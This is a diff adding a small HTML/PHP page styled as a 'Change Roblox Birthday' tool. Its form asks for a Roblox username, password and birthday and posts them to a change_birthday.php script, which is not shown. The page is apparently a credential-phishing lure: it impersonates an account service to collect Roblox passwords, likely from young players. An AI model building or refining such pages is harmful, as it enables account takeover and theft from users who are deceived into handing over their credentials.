@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Birthday Change</title>
+    <style>
+        body {
+            background-color: black;
+            color: lime;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid lime;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        input[type="date"] {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid lime;
+            border-radius: 5px;
+            background-color: black;
+            color: lime;
+        }
+
+        button {
+            background-color: white;
+            color: black;
+            padding: 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 90%;
+        }
+
+        button:hover {
+            background-color: lime;
+            color: black;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h2>Change Roblox Birthday</h2>
+        <form action="change_birthday.php" method="POST">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="date" name="birthday" required>
+            <button type="submit">Change Birthday</button>
+        </form>
+        <?php
+        if (isset($_GET['result'])) {
+            echo '<p>' . htmlspecialchars($_GET['result']) . '</p>';
+        }
+        ?>
+    </div>
+</body>
+
+</html>
